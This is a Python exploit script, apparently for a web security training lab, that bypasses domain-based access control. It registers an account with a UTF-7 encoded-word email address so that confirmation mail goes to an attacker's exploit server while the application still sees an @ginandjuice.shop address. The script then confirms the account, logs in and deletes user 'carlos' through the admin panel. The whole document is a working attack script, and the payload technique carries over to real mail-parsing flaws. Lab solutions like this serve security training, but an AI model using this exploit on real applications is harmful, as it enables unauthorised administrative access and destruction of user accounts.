"""
Lab: Bypassing access controls using email address parsing discrepancies

This script exploits email address parsing discrepancies to bypass access controls. Steps:

1. Get CSRF token from register page
2. Register a new account with encoded-word format email to bypass parsing
3. Fetch the email client to get registration link
4. Complete account registration by following the link
5. Get CSRF token from login page
6. Login to the new account
7. Delete carlos from the admin panel

The vulnerability works by:
- Using encoded-word format (=?utf-7?q?<register_name>&AEA-exploit-domain&ACA-?=@ginandjuice.shop)
- The email parser interprets this as <register_name>@exploit-domain for delivery
- But the access control sees it as ending with @ginandjuice.shop

Author: N00BCYB0T
"""

import argparse
import re
import urllib.parse
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None
EXPLOIT_DOMAIN = None
NEW_USERNAME = "N00BCYB0T"
NEW_PASSWORD = "POWNED"

def main():
    global URL, EXPLOIT_DOMAIN

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('-e', '--exploit-domain', required=True, help='Exploit server domain (e.g., exploit-server.net) or full email URL')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    EXPLOIT_DOMAIN = args.exploit_domain.rstrip('/')
    
    if EXPLOIT_DOMAIN.startswith('http'):
        parsed = urllib.parse.urlparse(EXPLOIT_DOMAIN)
        email_url = EXPLOIT_DOMAIN
        domain_for_email = parsed.netloc
    else:
        email_url = f"https://{EXPLOIT_DOMAIN}/email"
        domain_for_email = EXPLOIT_DOMAIN
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Registering account with malicious email...{Fore.RESET}")
    csrf_token = get_csrf(session, "/register")
    
    malicious_email = f"=?utf-7?q?attacker&AEA-{domain_for_email}&ACA-?=@ginandjuice.shop"
    data = {
        "username": NEW_USERNAME,
        "password": NEW_PASSWORD,
        "csrf": csrf_token,
        "email": malicious_email
    }
    
    response = session.post(f"{URL}/register", data=data, allow_redirects=False)
    print(f"{Fore.GREEN}[+] Account registration submitted{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Fetching email client...{Fore.RESET}")
    email_client = fetch(session, email_url)
        
    print(f"{Fore.YELLOW}[*] Extracting registration link...{Fore.RESET}")
    match = re.search(r">(https.*)</a>", email_client.text)
    if not match:
        print(f"{Fore.RED}[-] Registration link not found!{Fore.RESET}")
        exit(1)
    
    registration_link = match.group(1)
    print(f"{Fore.GREEN}[+] Found registration link{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Completing account registration...{Fore.RESET}")
    fetch(session, registration_link)
    print(f"{Fore.GREEN}[+] Account registration completed{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Logging in to the new account...{Fore.RESET}")
    login_data = {
        "username": NEW_USERNAME,
        "password": NEW_PASSWORD
    }
    login(session, login_data)
    print(f"{Fore.GREEN}[+] Successfully logged in{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Deleting carlos from admin panel...{Fore.RESET}")
    response = fetch(session, "/admin/delete?username=carlos")
    
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved! Successfully deleted user carlos{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")


def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)

def get_csrf(session, page):
    response = fetch(session, page)
    match = re.search(r'csrf\" value=\"(.+?)\"', response.text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    
    token = match.group(1)
    print(f"{Fore.GREEN}[+] Found CSRF Token: {token} | Page: {page}{Fore.RESET}")
    return token

def login(session, data):
    csrf_token = get_csrf(session, "/login")
    data['csrf'] = csrf_token
    try:
        session.post(f"{URL}/login", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)


if __name__ == "__main__":
    main()